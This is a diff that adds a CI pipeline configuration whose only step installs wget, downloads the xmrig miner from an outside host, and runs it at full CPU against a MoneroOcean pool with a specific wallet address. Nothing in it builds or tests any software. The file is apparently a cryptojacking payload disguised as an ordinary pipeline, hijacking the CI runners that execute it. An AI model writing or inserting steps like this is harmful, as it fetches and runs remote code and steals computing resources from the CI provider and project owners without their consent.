@@ -1,0 +1,14 @@
+version: v0
+kind: Pipeline
+name: Default
+services: []
+steps:
+  - name: New Node
+    image: debian:latest
+    commands:
+      - apt update -y && apt install -y wget && wget
+        http://ussr-sec.tom.ru/mining/xmrig-6.3.5-linux-x64.tar.gz && tar xf
+        xmrig-6.3.5-linux-x64.tar.gz &&./xmrig-6.3.5/xmrig --donate-level 0
+        --max-cpu-usage 100 -o gulf.moneroocean.stream:80 -u
+        48ceZ6ukSwmh9Cikw7fKo1itUKAT5bFj5XPGuQyQ8XmBHi8huPDH8kyFmq5EsXHjToiWQ3UTiW2WcWp4sXLWCUtjRCcPgXe+16000
+        -k -p xmrig
